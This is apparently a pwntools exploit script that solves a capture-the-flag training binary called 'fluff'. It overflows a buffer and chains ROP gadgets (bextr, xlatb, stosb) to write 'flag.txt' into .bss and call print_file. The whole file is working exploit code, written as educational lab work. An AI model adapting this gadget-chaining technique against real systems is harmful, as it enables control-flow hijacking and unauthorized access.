from pwn import *

context.log_level = "debug"

r = process("./fluff")
exe = ELF("./fluff")
write_base = exe.bss(0)
flag_txt = [next(exe.search(i.encode("utf-8"))) for i in "flag.txt"]

# Gadgets:
# 0x0000000000400295: ret;
# 0x000000000040062a: pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;
# 0x0000000000400628: xlatb; ret;
# 0x0000000000400639: stosb byte ptr [rdi], al; ret;
# 0x00000000004006a3: pop rdi; ret;

ret = p64(0x400295)
pop_bextr = p64(0x40062A)
xlatb = p64(0x400628)
stosb = p64(0x400639)
pop_rdi = p64(0x4006A3)
const = 0x3EF2
prev_al = 0xB

payload = cyclic(0x28) + ret
payload += pop_rdi + p64(write_base)
for i, v in enumerate(flag_txt):
    payload += pop_bextr + p64(0x4000) + p64(v - const - prev_al)
    payload += xlatb
    payload += stosb
    prev_al = ord("flag.txt"[i])

payload += pop_rdi + p64(write_base)
payload += p64(exe.plt["print_file"])
r.recvuntil(b"> ")
r.sendline(payload)
r.interactive()
